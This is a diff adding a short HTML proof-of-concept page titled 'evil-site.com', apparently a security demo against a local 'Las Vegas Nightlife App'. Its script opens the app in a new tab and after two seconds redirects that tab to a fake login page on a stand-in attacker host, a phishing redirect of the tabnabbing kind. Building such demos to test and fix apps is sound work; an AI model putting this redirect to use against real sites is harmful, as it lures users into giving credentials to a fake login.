@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>evil-site.com</title>
+    <script>
+        function attackVictim() {
+            const victim = window.open("http://localhost:3000", "_blank");
+
+            // Redirect the victim application after it opens
+            setTimeout(() => {
+                victim.location = "http://evil-site.com/fake-login";
+            }, 2000); // Wait for the victim page to load
+        }
+    </script>
+</head>
+<body>
+    <h1>Evil Site</h1>
+    <button onclick="attackVictim()">Open the Las Vegas Nightlife App</button>
+</body>
+</html>
